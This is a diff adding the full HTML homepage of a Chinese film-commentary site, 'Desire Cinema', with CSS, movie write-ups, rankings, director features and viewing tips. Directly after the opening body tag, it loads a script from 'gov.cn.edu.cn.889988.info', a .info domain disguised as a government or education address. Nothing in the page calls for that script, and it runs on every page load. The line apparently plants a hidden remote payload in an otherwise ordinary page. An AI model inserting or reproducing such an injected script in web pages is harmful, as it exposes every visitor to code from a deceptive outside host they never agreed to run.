@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="色欲电影网聚焦人性色欲题材的电影解读与片单推荐，从情欲、权力、金钱、执念四个维度拆解经典影片，提供高分片单、导演专题、口碑榜单与观影指南。">
+<meta name="keywords" content="色欲电影网,人性色欲电影,情欲电影推荐,高分剧情片,电影解读,导演专题,电影榜单,观影指南">
+<meta name="author" content="色欲电影网">
+<meta name="theme-color" content="#3a0a2c">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<title>色欲电影网 - 看懂人性色欲的电影解读</title>
+<link rel="canonical" href="https://seyudianyingwang-cn.github.io/">
+<style>
+:root{
+  --ink:#2a061c; --ink2:#5b1538; --paper:#fbf6f2; --card:#fff;
+  --line:#f0dfe6; --muted:#8f6b7c;
+  --plum:#6d1c4f; --rose:#e11d74; --coral:#ff6b6b; --gold:#e5a93d; --cream:#fbeee3;
+  --r:18px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:ui-serif,Georgia,"Songti SC","SimSun",serif;
+  background:var(--paper);color:var(--ink);line-height:1.75;font-size:15.5px;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none;outline:none}
+a:focus-visible,button:focus-visible,input:focus-visible{outline:2px solid var(--rose);outline-offset:2px}
+img{max-width:100%;display:block}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+::selection{background:var(--rose);color:#fff}
+/* ===== 顶栏 ===== */
+header{background:var(--ink);color:#f7e9ef;position:sticky;top:0;z-index:60}
+.nav{display:flex;align-items:center;gap:14px;height:70px}
+.logo{display:flex;align-items:baseline;gap:10px;color:#fff}
+.logo b{font-size:22px;font-weight:900;letter-spacing:2px}
+.logo b i{font-style:normal;color:var(--coral)}
+.logo em{font-style:normal;font-size:10px;letter-spacing:3px;color:#d9a9bf;font-family:ui-sans-serif,system-ui,sans-serif}
+nav.primary{display:flex;gap:2px;margin-left:18px;font-family:ui-sans-serif,system-ui,sans-serif}
+nav.primary a{font-size:13px;font-weight:600;padding:9px 14px;color:#e7cddb;border-radius:8px;letter-spacing:.5px}
+nav.primary a:hover{background:rgba(255,255,255,.08);color:#fff}
+.search{margin-left:auto;display:flex;align-items:center;gap:6px;background:rgba(255,255,255,.09);border-radius:24px;padding:5px 6px 5px 14px;font-family:ui-sans-serif,system-ui,sans-serif}
+.search input{border:0;background:none;color:#fff;font:inherit;font-size:13px;width:150px;outline:none}
+.search input::placeholder{color:#c89cb4}
+.search button{border:0;background:var(--rose);color:#fff;font:inherit;font-size:12px;font-weight:800;padding:8px 15px;border-radius:20px;cursor:pointer;letter-spacing:1px}
+.ham{display:none;background:none;border:0;color:#fff;font-size:28px;cursor:pointer;margin-left:auto}
+/* ===== Hero ===== */
+.hero{position:relative;padding:56px 0 40px;overflow:hidden}
+.hero::before{content:"";position:absolute;inset:0;background:
+  radial-gradient(900px 420px at 82% 18%,rgba(225,29,116,.30),transparent 60%),
+  radial-gradient(700px 400px at 12% 82%,rgba(229,169,61,.24),transparent 62%);
+  z-index:0}
+.hero-in{position:relative;z-index:1;display:grid;grid-template-columns:1.1fr .9fr;gap:44px;align-items:center}
+.eyebrow{font-family:ui-sans-serif,system-ui,sans-serif;font-size:11px;letter-spacing:3px;color:var(--rose);font-weight:800}
+h1{font-size:clamp(34px,5.6vw,62px);line-height:1.18;font-weight:900;letter-spacing:-.5px;margin-top:12px}
+h1 .grad{background:linear-gradient(100deg,var(--coral),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent}
+h1 u{text-decoration:none;color:var(--rose);font-style:italic}
+.lede{color:#6b4a5e;margin:18px 0 24px;max-width:560px;font-size:16px}
+.hero-acts{display:flex;gap:12px;flex-wrap:wrap;font-family:ui-sans-serif,system-ui,sans-serif}
+.btn{border:0;cursor:pointer;font:inherit;font-weight:800;font-size:14px;padding:14px 28px;border-radius:30px;transition:.25s;display:inline-flex;align-items:center;gap:7px;letter-spacing:.5px}
+.btn-main{background:var(--ink);color:#fff;box-shadow:0 16px 30px rgba(42,6,28,.28)}
+.btn-main:hover{background:var(--rose);transform:translateY(-2px)}
+.btn-soft{background:#fff;color:var(--ink);border:1px solid #e7d2dc}
+/* 情绪色卡 */
+.palette{background:rgba(255,255,255,.62);backdrop-filter:blur(10px);border:1px solid #f3e2e9;border-radius:20px;padding:20px}
+.palette h3{font-size:13px;color:var(--muted);font-weight:700;letter-spacing:2px;font-family:ui-sans-serif,system-ui,sans-serif}
+.palette .lab{font-size:20px;font-weight:900;margin:4px 0 14px;line-height:1.4}
+.swatches{display:grid;grid-template-columns:repeat(5,1fr);gap:8px}
+.sw{height:64px;border-radius:12px;position:relative;cursor:pointer;transition:.2s}
+.sw:hover{transform:scale(1.05)}
+.sw span{position:absolute;left:8px;bottom:6px;font-family:ui-sans-serif,system-ui,sans-serif;font-size:9px;color:#fff;letter-spacing:1px;text-shadow:0 1px 2px rgba(0,0,0,.4)}
+/* ===== section 通用 ===== */
+section{padding:58px 0}
+.st{display:flex;align-items:baseline;justify-content:space-between;gap:14px;flex-wrap:wrap;border-bottom:1px solid var(--line);padding-bottom:12px;margin-bottom:26px}
+.st h2{font-size:clamp(23px,3.4vw,31px);font-weight:900;letter-spacing:.5px;display:flex;align-items:center;gap:12px}
+.st h2::before{content:"";width:14px;height:14px;border-radius:50%;background:var(--rose);box-shadow:-6px 0 0 var(--gold)}
+.st a.more{font-family:ui-sans-serif,system-ui,sans-serif;font-size:12.5px;font-weight:700;color:var(--muted);letter-spacing:.5px}
+.st a.more:hover{color:var(--rose)}
+/* ===== A 电影：双栏杂志 ===== */
+.mag{display:grid;grid-template-columns:1.35fr 1fr;gap:26px;align-items:stretch}
+.lead{background:var(--ink);color:#fbeee3;border-radius:22px;overflow:hidden;display:flex;flex-direction:column;position:relative}
+.lead .art{height:200px;background:linear-gradient(135deg,#3a0a2c,#8a1c55 55%,#e5a93d)}
+.lead .tx{padding:24px 26px;flex:1;display:flex;flex-direction:column;justify-content:space-between}
+.lead .kicker{font-family:ui-sans-serif,system-ui,sans-serif;font-size:10.5px;letter-spacing:3px;color:var(--coral);font-weight:800}
+.lead h3{font-size:27px;line-height:1.35;margin:10px 0}
+.lead p{color:#e7cddb;font-size:14.5px}
+.lead .tags{margin-top:16px;display:flex;gap:7px;flex-wrap:wrap;font-family:ui-sans-serif,system-ui,sans-serif}
+.lead .tags i{font-style:normal;font-size:11px;font-weight:700;padding:4px 10px;border-radius:20px;background:rgba(255,255,255,.12)}
+.side{display:flex;flex-direction:column;gap:14px}
+.mini{display:grid;grid-template-columns:74px 1fr;gap:14px;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:14px;transition:.22s;cursor:pointer}
+.mini:hover{border-color:var(--rose);transform:translateX(4px)}
+.mini .sq{height:74px;border-radius:11px;background:linear-gradient(150deg,var(--a,#6d1c4f),var(--b,#e11d74))}
+.mini h4{font-size:15.5px;line-height:1.45}
+.mini small{color:var(--muted);font-size:12px;font-family:ui-sans-serif,system-ui,sans-serif}
+.mini .dots{margin-top:7px;display:flex;gap:5px}
+.mini .dots i{width:14px;height:14px;border-radius:4px;font-style:normal;opacity:.85}
+/* ===== B 类型片单：竖向色带 ===== */
+.ribbon{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.rib{background:var(--card);border:1px solid var(--line);border-radius:18px;overflow:hidden;transition:.26s;cursor:pointer}
+.rib:hover{transform:translateY(-5px);box-shadow:0 22px 40px rgba(109,28,79,.16)}
+.rib .band{height:96px;position:relative;background:linear-gradient(120deg,var(--a,#6d1c4f),var(--b,#ff6b6b))}
+.rib .band b{position:absolute;right:14px;bottom:10px;color:#fff;font-size:34px;font-weight:900;font-style:italic;opacity:.85;font-family:Georgia,serif}
+.rib .bd{padding:18px 20px}
+.rib h4{font-size:17px}
+.rib p{font-size:12.5px;color:var(--muted);margin:6px 0 12px;min-height:38px}
+.rib .chips{display:flex;gap:6px;flex-wrap:wrap;font-family:ui-sans-serif,system-ui,sans-serif}
+.rib .chips span{font-size:10.5px;font-weight:700;padding:3px 9px;border-radius:6px;background:var(--cream);color:var(--ink2)}
+/* ===== C 榜单：翻页记分牌 ===== */
+.scoreboard{display:grid;grid-template-columns:1.15fr 1fr;gap:18px}
+.flip{background:var(--ink);color:#fbeee3;border-radius:20px;padding:24px;display:flex;flex-direction:column;gap:14px}
+.flip .row{display:grid;grid-template-columns:44px 1fr 96px;gap:14px;align-items:center}
+.flip .no{height:44px;border-radius:12px;display:grid;place-items:center;font-family:ui-sans-serif,system-ui,sans-serif;font-weight:900;font-size:19px;background:linear-gradient(150deg,var(--coral),var(--gold));color:#3a0a2c}
+.flip .nm{font-size:16px;font-weight:700}
+.flip .nm small{display:block;color:#c99aae;font-size:11.5px;font-weight:500;font-family:ui-sans-serif,system-ui,sans-serif}
+.flip .rate{text-align:right;font-family:ui-sans-serif,system-ui,sans-serif;font-size:12px;color:#c99aae}
+.flip .rate b{display:block;color:var(--gold);font-size:19px;font-variant-numeric:tabular-nums}
+.scorecard{background:linear-gradient(160deg,#fff4e6,#fbeee3);border:1px solid #f3dfc9;border-radius:20px;padding:24px;display:flex;flex-direction:column;justify-content:space-between}
+.scorecard h3{font-size:14px;color:var(--muted);letter-spacing:2px;font-family:ui-sans-serif,system-ui,sans-serif}
+.scorecard .big{font-size:44px;font-weight:900;line-height:1;color:var(--ink);font-variant-numeric:tabular-nums}
+.scorecard .big small{font-size:15px;color:var(--rose);font-weight:800}
+.scorecard p{color:#7a5a6c;font-size:13px}
+/* ===== D 导演专题：横向叠片 ===== */
+.reel{position:relative;padding:30px 0 10px}
+.reel-track{display:flex;gap:0;overflow-x:auto;scroll-snap-type:x mandatory;padding:6px 4px 20px;scrollbar-width:thin}
+.reel-track::-webkit-scrollbar{height:9px}
+.reel-track::-webkit-scrollbar-thumb{background:#e7b8c9;border-radius:6px}
+.dcard{flex:0 0 300px;margin-left:-70px;scroll-snap-align:center;position:relative;transition:.3s;cursor:pointer}
+.dcard:first-child{margin-left:0}
+.dcard:hover{transform:translateY(-10px) rotate(-1.5deg);z-index:5}
+.dcard .post{height:180px;border-radius:14px;box-shadow:0 16px 30px rgba(58,10,44,.3);background:linear-gradient(155deg,var(--a,#3a0a2c),var(--b,#e11d74))}
+.dcard .info{position:absolute;left:16px;right:16px;bottom:14px;color:#fff;text-shadow:0 2px 6px rgba(0,0,0,.5)}
+.dcard .info h4{font-size:16px}
+.dcard .info small{font-size:11px;font-family:ui-sans-serif,system-ui,sans-serif;letter-spacing:1px}
+/* ===== E 赏析：引文卡 ===== */
+.quotegrid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+.qc{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:24px 26px;position:relative;transition:.22s;cursor:pointer}
+.qc::before{content:"\201C";position:absolute;right:20px;top:-6px;font-size:74px;line-height:1;color:#f7d7e2;font-family:Georgia,serif}
+.qc:hover{background:#fff6f2;border-color:var(--coral)}
+.qc .cat{font-family:ui-sans-serif,system-ui,sans-serif;font-size:10.5px;letter-spacing:2px;color:var(--rose);font-weight:800}
+.qc h4{font-size:17px;margin:8px 0 10px;line-height:1.5}
+.qc blockquote{color:#7a5a6c;font-size:14px;font-style:italic;border-left:2px solid var(--gold);padding-left:12px}
+.qc .who{margin-top:12px;font-size:12px;color:var(--muted);font-family:ui-sans-serif,system-ui,sans-serif}
+/* ===== F 指南：折页时间轴 ===== */
+.book{display:grid;grid-template-columns:repeat(4,1fr);gap:0;background:var(--card);border:1px solid var(--line);border-radius:20px;overflow:hidden}
+.page{padding:26px 22px;border-right:1px dashed var(--line);position:relative}
+.page:last-child{border:0}
+.page .num{font-family:ui-sans-serif,system-ui,sans-serif;font-size:12px;font-weight:800;color:var(--coral);letter-spacing:2px}
+.page h4{font-size:16.5px;margin:6px 0 8px}
+.page p{font-size:12.5px;color:var(--muted);font-family:ui-sans-serif,system-ui,sans-serif;line-height:1.7}
+/* ===== Footer ===== */
+footer{background:var(--ink);color:#e7cddb;padding:50px 0 22px;margin-top:16px}
+.foot{display:grid;grid-template-columns:1.9fr 1fr 1fr 1fr;gap:30px;margin-bottom:26px}
+.foot .brand{color:#fff;font-size:20px;font-weight:900;letter-spacing:2px}
+.foot .brand em{font-style:normal;color:var(--coral);font-size:11px;letter-spacing:3px;display:block;font-weight:600;margin-top:4px;font-family:ui-sans-serif,system-ui,sans-serif}
+.foot p.about{color:#b891a4;font-size:13px;margin-top:12px;max-width:330px}
+.foot h5{color:#fff;font-size:13px;letter-spacing:2px;margin-bottom:12px;font-family:ui-sans-serif,system-ui,sans-serif}
+.foot a{display:block;color:#b891a4;font-size:13px;padding:4px 0;font-family:ui-sans-serif,system-ui,sans-serif}
+.foot a:hover{color:var(--coral)}
+.copy{text-align:center;color:#8f6a80;font-size:12px;border-top:1px solid rgba(255,255,255,.1);padding-top:20px;font-family:ui-sans-serif,system-ui,sans-serif}
+.copy a{color:var(--coral)}
+@media(max-width:980px){
+  nav.primary,.search{display:none}
+  .ham{display:block}
+  .drawer{position:fixed;inset:70px 0 0 0;background:var(--ink);padding:22px;transform:translateX(102%);transition:.32s;z-index:55;display:flex;flex-direction:column;gap:4px;overflow:auto}
+  .drawer.open{transform:none}
+  .drawer a{color:#f7e9ef;font-size:17px;font-weight:600;padding:15px 18px;border-radius:10px;font-family:ui-sans-serif,system-ui,sans-serif}
+  .drawer a:hover{background:rgba(255,255,255,.08)}
+  .hero-in{grid-template-columns:1fr}
+  .mag,.scoreboard,.quotegrid{grid-template-columns:1fr}
+  .ribbon{grid-template-columns:1fr 1fr}
+  .book{grid-template-columns:1fr 1fr}
+}
+@media(max-width:560px){
+  .ribbon,.book{grid-template-columns:1fr}
+  .page{border-right:0;border-bottom:1px dashed var(--line)}
+  .swatches{grid-template-columns:repeat(5,1fr)}
+  .sw{height:44px}
+  .sw span{display:none}
+  .dcard{flex:0 0 240px;margin-left:-44px}
+  section{padding:46px 0}
+  .flip .row{grid-template-columns:36px 1fr 74px;gap:9px}
+}
+@media print{body{background:#fff;color:#000}.nav,.btn,.search,.palette{display:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <a class="logo" href="#top" aria-label="色欲电影网 首页">
+      <b><i>色欲</i>电影网</b><em>DESIRE CINEMA</em>
+    </a>
+    <nav class="primary" aria-label="主导航">
+      <a href="#film">电影</a>
+      <a href="#genre">片单</a>
+      <a href="#rank">榜单</a>
+      <a href="#director">导演</a>
+      <a href="#read">解读</a>
+      <a href="#guide">指南</a>
+    </nav>
+    <div class="search" role="search">
+      <input type="search" placeholder="片名 / 导演 / 色欲类型" aria-label="搜索">
+      <button>检索</button>
+    </div>
+    <button class="ham" id="ham" aria-label="菜单" aria-expanded="false">☰</button>
+  </div>
+  <div class="drawer" id="drawer" aria-label="移动端导航">
+    <a href="#film">电影解读</a>
+    <a href="#genre">色欲片单</a>
+    <a href="#rank">口碑榜单</a>
+    <a href="#director">导演专题</a>
+    <a href="#read">影像笔记</a>
+    <a href="#guide">观影指南</a>
+    <a href="#about">关于本站</a>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- HERO -->
+  <section class="hero">
+    <div class="wrap hero-in">
+      <div>
+        <span class="eyebrow">◆ 看懂人性色欲的电影</span>
+        <h1>色欲电影网，<br>讲清银幕背后的<span class="grad">那点念想</span> <u>—</u></h1>
+        <p class="lede">色欲电影网不做流水账式的片库，只做人性色欲的拆解：情欲、权力、金钱、执念——每一种色欲在镜头里都有它的颜色与语法。让你在按下播放键之前，先知道这部片"想要什么"。</p>
+        <div class="hero-acts">
+          <a class="btn btn-main" href="#film">开始读片 →</a>
+          <a class="btn btn-soft" href="#rank">今日推荐</a>
+        </div>
+      </div>
+      <aside class="palette" aria-label="色欲情绪色卡">
+        <h3>DESIRE MOOD / 色欲色谱</h3>
+        <p class="lab">"这一幕，是<b style="color:var(--rose)">情欲的红</b>，也是<b style="color:var(--gold)">权力的橙</b>。"</p>
+        <div class="swatches">
+          <div class="sw" style="background:#8a1c55"><span>情欲</span></div>
+          <div class="sw" style="background:#e11d74"><span>热烈</span></div>
+          <div class="sw" style="background:#c2410c"><span>权力</span></div>
+          <div class="sw" style="background:#e5a93d"><span>金钱</span></div>
+          <div class="sw" style="background:#2a061c"><span>执念</span></div>
+        </div>
+      </aside>
+    </div>
+  </section>
+
+  <!-- 栏目 1：电影（杂志双栏） -->
+  <section id="film" class="wrap" itemscope itemtype="https://schema.org/ItemList">
+    <div class="st">
+      <h2>本期主推 <span style="font-size:12px;color:var(--muted);font-weight:600;letter-spacing:2px">FEATURE</span></h2>
+      <a class="more" href="#">电影索引 ›</a>
+    </div>
+    <div class="mag">
+      <a class="lead" href="#" itemprop="itemListElement" itemscope itemtype="https://schema.org/Movie">
+        <div class="art" role="img" aria-label="《绯色房间》视觉图"></div>
+        <div class="tx">
+          <div>
+            <span class="kicker">COVER STORY</span>
+            <h3 itemprop="name">绯色房间：<br>用一面墙，讲完一场婚姻</h3>
+            <p>全片 87% 的镜头发生在同一间客厅，墙面从米白渐变为绛红。美术指导用"墙的颜色"替代台词，完成了一次安静却锋利的家庭叙事——关于占有、关于沉默、关于谁先移开目光。</p>
+          </div>
+          <div class="tags"><i>剧情</i><i>婚姻</i><i>美术指导</i><i>★ 8.8</i></div>
+        </div>
+      </a>
+      <div class="side">
+        <a class="mini" href="#"><div class="sq" style="--a:#3a0a2c;--b:#e5a93d"></div><div><h4>海边电影院</h4><small>蓝绿色调 · 胶片颗粒 · 112 分钟</small><div class="dots"><i style="background:#0e7490"></i><i style="background:#67e8f9"></i><i style="background:#fde68a"></i></div></div></a>
+        <a class="mini" href="#"><div class="sq" style="--a:#7c2d12;--b:#f97316"></div><div><h4>橘色公路</h4><small>暖橙逆光 · 公路片 · 98 分钟</small><div class="dots"><i style="background:#c2410c"></i><i style="background:#fdba74"></i><i style="background:#fef3c7"></i></div></div></a>
+        <a class="mini" href="#"><div class="sq" style="--a:#4c1d95;--b:#a855f7"></div><div><h4>午夜紫罗兰</h4><small>霓虹紫调 · 悬疑 · 126 分钟</small><div class="dots"><i style="background:#7c3aed"></i><i style="background:#d8b4e8"></i><i style="background:#1e1b4b"></i></div></div></a>
+        <a class="mini" href="#"><div class="sq" style="--a:#064e3b;--b:#34d399"></div><div><h4>苔原来信</h4><small>低饱和绿 · 极简构图 · 104 分钟</small><div class="dots"><i style="background:#047857"></i><i style="background:#a7f3d0"></i><i style="background:#d1d5db"></i></div></div></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目 2：色欲片单（竖向色带） -->
+  <section id="genre" class="wrap">
+    <div class="st">
+      <h2>色欲片单 <span style="font-size:12px;color:var(--muted);font-weight:600;letter-spacing:2px">DESIRE LIST</span></h2>
+      <a class="more" href="#">全部片单 ›</a>
+    </div>
+    <div class="ribbon">
+      <a class="rib" href="#"><div class="band" style="--a:#3a0a2c;--b:#be185d"><b>Lust</b></div><div class="bd"><h4>情欲：10 部不敢快进的电影</h4><p>色欲被克制时最动人，被释放时最危险。</p><div class="chips"><span>情欲</span><span>文艺</span><span>成人</span></div></div></a>
+      <a class="rib" href="#"><div class="band" style="--a:#0c4a6e;--b:#38bdf8"><b>Power</b></div><div class="bd"><h4>权力：8 部办公室里的角斗场</h4><p>椅子、门、走廊——权力的布景从来很朴素。</p><div class="chips"><span>政治</span><span>悬疑</span><span>群像</span></div></div></a>
+      <a class="rib" href="#"><div class="band" style="--a:#713f12;--b:#fbbf24"><b>Gold</b></div><div class="bd"><h4>金钱：贪婪的 9 种表情</h4><p>钱不改变人，钱让人现出原形。</p><div class="chips"><span>商战</span><span>犯罪</span><span>黑色</span></div></div></a>
+      <a class="rib" href="#"><div class="band" style="--a:#14532d;--b:#4ade80"><b>Obsess</b></div><div class="bd"><h4>执念：走火入魔的 7 夜</h4><p>偏执狂是最好也最可怕的主角。</p><div class="chips"><span>心理</span><span>惊悚</span><span>独白</span></div></div></a>
+      <a class="rib" href="#"><div class="band" style="--a:#4c1d95;--b:#c084fc"><b>City</b></div><div class="bd"><h4>都市：霓虹下的孤独欲</h4><p>城市越热闹，人的色欲越具体。</p><div class="chips"><span>都市</span><span>爱情</span><span>现代</span></div></div></a>
+      <a class="rib" href="#"><div class="band" style="--a:#1c1917;--b:#78716c"><b>Noir</b></div><div class="bd"><h4>禁忌：黑色电影的色欲暗面</h4><p>黑白影像里，色欲没有缓冲地带。</p><div class="chips"><span>黑白</span><span>犯罪</span><span>经典</span></div></div></a>
+    </div>
+  </section>
+
+  <!-- 栏目 3：榜单（翻页记分牌） -->
+  <section id="rank" class="wrap">
+    <div class="st">
+      <h2>色欲影像榜 <span style="font-size:12px;color:var(--muted);font-weight:600;letter-spacing:2px">TOP 5</span></h2>
+      <a class="more" href="#">完整榜单 ›</a>
+    </div>
+    <div class="scoreboard" itemscope itemtype="https://schema.org/ItemList">
+      <div class="flip">
+        <div class="row" itemprop="itemListElement"><span class="no">01</span><span class="nm">绯色房间<small>婚姻 / 占有欲</small></span><span class="rate"><b>9.4</b>共识最高</span></div>
+        <div class="row" itemprop="itemListElement"><span class="no">02</span><span class="nm">海边电影院<small>乡愁 / 未完成</small></span><span class="rate"><b>9.1</b>质感首选</span></div>
+        <div class="row" itemprop="itemListElement"><span class="no">03</span><span class="nm">橘色公路<small>自由 / 出走</small></span><span class="rate"><b>8.9</b>公路片</span></div>
+        <div class="row"><span class="no">04</span><span class="nm">午夜紫罗兰<small>控制 / 窥视</small></span><span class="rate"><b>8.7</b>视觉系</span></div>
+        <div class="row"><span class="no">05</span><span class="nm">苔原来信<small>执念 / 等待</small></span><span class="rate"><b>8.6</b>安静力量</span></div>
+      </div>
+      <div class="scorecard">
+        <h3>本周影片</h3>
+        <div class="big">9.4 <small>/ 10</small></div>
+        <p style="margin-top:14px">《绯色房间》以"墙面变色"完成情绪推进，被影评人称为"用美术指导替代编剧的一年"。本周推荐在大屏、暗室、关灯状态下观看。</p>
+        <a class="btn btn-main" href="#" style="margin-top:16px;padding:11px 22px;font-size:13px">查看分镜解读 →</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目 4：导演专题（横向叠片） -->
+  <section id="director" class="wrap">
+    <div class="st">
+      <h2>导演专题 <span style="font-size:12px;color:var(--muted);font-weight:600;letter-spacing:2px">AUTEUR</span></h2>
+      <a class="more" href="#">全部导演 ›</a>
+    </div>
+    <div class="reel">
+      <div class="reel-track">
+        <a class="dcard" href="#"><div class="post" style="--a:#3a0a2c;--b:#e11d74"></div><div class="info"><h4>王家卫</h4><small>霓虹 · 抽帧 · 时间</small></div></a>
+        <a class="dcard" href="#"><div class="post" style="--a:#0c4a6e;--b:#0284c7"></div><div class="info"><h4>是枝裕和</h4><small>留白 · 日常 · 绿意</small></div></a>
+        <a class="dcard" href="#"><div class="post" style="--a:#713f12;--b:#d97706"></div><div class="info"><h4>帕索里尼</h4><small>身体 · 宗教 · 原欲</small></div></a>
+        <a class="dcard" href="#"><div class="post" style="--a:#14532d;--b:#15803d"></div><div class="info"><h4>李安</h4><small>克制 · 压抑 · 爆发</small></div></a>
+        <a class="dcard" href="#"><div class="post" style="--a:#4c1d95;--b:#7c3aed"></div><div class="info"><h4>大卫·芬奇</h4><small>冷调 · 控制 · 色欲</small></div></a>
+        <a class="dcard" href="#"><div class="post" style="--a:#1c1917;--b:#57534e"></div><div class="info"><h4>希区柯克</h4><small>凝视 · 窥视 · 悬念</small></div></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目 5：解读（引文卡） -->
+  <section id="read" class="wrap">
+    <div class="st">
+      <h2>影像笔记 <span style="font-size:12px;color:var(--muted);font-weight:600;letter-spacing:2px">READING</span></h2>
+      <a class="more" href="#">全部笔记 ›</a>
+    </div>
+    <div class="quotegrid">
+      <a class="qc" href="#"><span class="cat">情欲</span><h4>为什么情欲戏总在厨房发生？</h4><blockquote>厨房是家里最"不安全"的房间：刀、火、水、玻璃。色欲需要一点危险感才能成立。</blockquote><span class="who">— 读片笔记 · 阅读 1.6 万</span></a>
+      <a class="qc" href="#"><span class="cat">权力</span><h4>镜头越低，人物越弱</h4><blockquote>俯拍不是"上帝视角"，是"审判视角"。当导演把摄影机抬到天花板，人物就已经输了。</blockquote><span class="who">— 导演专题 · 阅读 9 千</span></a>
+      <a class="qc" href="#"><span class="cat">金钱</span><h4>数钱的手，是最诚实的表演</h4><blockquote>贪婪不需要台词。指尖的停顿、钞票的边缘、呼吸的节奏，比任何独白都更准确。</blockquote><span class="who">— 表演课 · 阅读 2.1 万</span></a>
+      <a class="qc" href="#"><span class="cat">执念</span><h4>沉默，是最高级的色欲</h4><blockquote>把台词抽掉的那三秒，比任何告白都更让人坐直身体。</blockquote><span class="who">— 声音设计 · 阅读 7 千</span></a>
+    </div>
+  </section>
+
+  <!-- 栏目 6：观影指南（折页） -->
+  <section id="guide" class="wrap">
+    <div class="st">
+      <h2>观影指南 <span style="font-size:12px;color:var(--muted);font-weight:600;letter-spacing:2px">HOW TO WATCH</span></h2>
+      <a class="more" href="#">完整指南 ›</a>
+    </div>
+    <div class="book">
+      <div class="page"><span class="num">P.01</span><h4>关灯</h4><p>色欲类影片的第一条规则：环境光越弱，画面信息越多。手机屏幕请反扣。</p></div>
+      <div class="page"><span class="num">P.02</span><h4>看手</h4><p>别先看脸，先看手。手指、掌心、指甲，藏着角色最真实的色欲。</p></div>
+      <div class="page"><span class="num">P.03</span><h4>听静</h4><p>注意"没有声音"的那几秒，那是导演留给观众的呼吸口。</p></div>
+      <div class="page"><span class="num">P.04</span><h4>二刷</h4><p>第一遍看故事，第二遍看色欲。好电影的第二次观看，往往是一次新片。</p></div>
+    </div>
+  </section>
+
+  <!-- 栏目 7：关于 -->
+  <section id="about" class="wrap">
+    <div class="st">
+      <h2>关于色欲电影网 <span style="font-size:12px;color:var(--muted);font-weight:600;letter-spacing:2px">ABOUT</span></h2>
+      <a class="more" href="#">合作与投稿 ›</a>
+    </div>
+    <div class="book">
+      <div class="page"><span class="num">壹</span><h4>我们读片</h4><p>不只告诉你看什么，还告诉你"角色到底想要什么"。</p></div>
+      <div class="page"><span class="num">贰</span><h4>我们分类</h4><p>每期片单按色欲类型归类，而非按票房或热度。</p></div>
+      <div class="page"><span class="num">叁</span><h4>我们引路</h4><p>本站为赏析与导航，观看请前往合法授权平台。</p></div>
+      <div class="page"><span class="num">肆</span><h4>我们慢看</h4><p>反对倍速，倡导把一部好片看完、再看一遍。</p></div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <div class="brand">色欲电影网<em>DESIRE CINEMA</em></div>
+        <p class="about">色欲电影网是一个关于"人性色欲"的影视赏析与发现平台。我们相信，看懂一部电影的第一步，是看懂角色想要什么。</p>
+      </div>
+      <div>
+        <h5>频道</h5>
+        <a href="#film">电影解读</a>
+        <a href="#genre">色欲片单</a>
+        <a href="#director">导演专题</a>
+        <a href="#rank">口碑榜单</a>
+        <a href="#read">影像笔记</a>
+      </div>
+      <div>
+        <h5>色欲索引</h5>
+        <a href="#">情欲 · 身体</a>
+        <a href="#">权力 · 控制</a>
+        <a href="#">金钱 · 贪婪</a>
+        <a href="#">执念 · 偏执</a>
+        <a href="#">孤独 · 都市</a>
+      </div>
+      <div>
+        <h5>关于</h5>
+        <a href="#about">关于本站</a>
+        <a href="#guide">观影指南</a>
+        <a href="#">投稿合作</a>
+        <a href="#">版权声明</a>
+        <a href="#">意见反馈</a>
+      </div>
+    </div>
+    <div class="copy">
+      © <span id="yr">2026</span> 色欲电影网 &nbsp;|&nbsp; 网站网址：<a href="https://seyudianyingwang-cn.github.io">https://seyudianyingwang-cn.github.io</a> &nbsp;|&nbsp; 本站为影视赏析与信息导航，倡导支持正版影视与创作者
+    </div>
+  </div>
+</footer>
+
+<script>
+var ham=document.getElementById('ham'),dr=document.getElementById('drawer');
+ham.addEventListener('click',function(){
+  dr.classList.toggle('open');
+  var o=dr.classList.contains('open');
+  ham.setAttribute('aria-expanded',o);
+  ham.textContent=o?'✕':'☰';
+});
+dr.addEventListener('click',function(e){if(e.target.tagName==='A'){dr.classList.remove('open');ham.setAttribute('aria-expanded','false');ham.textContent='☰';}});
+document.querySelectorAll('.sw').forEach(function(s){
+  s.addEventListener('click',function(){
+    var name=s.querySelector('span').textContent;
+    document.querySelector('.palette .lab').innerHTML='这一幕的主色，是 <b style="color:var(--rose)">'+name+'</b>。';
+  });
+});
+document.getElementById('yr').textContent=new Date().getFullYear();
+</script>
+</body>
+</html>
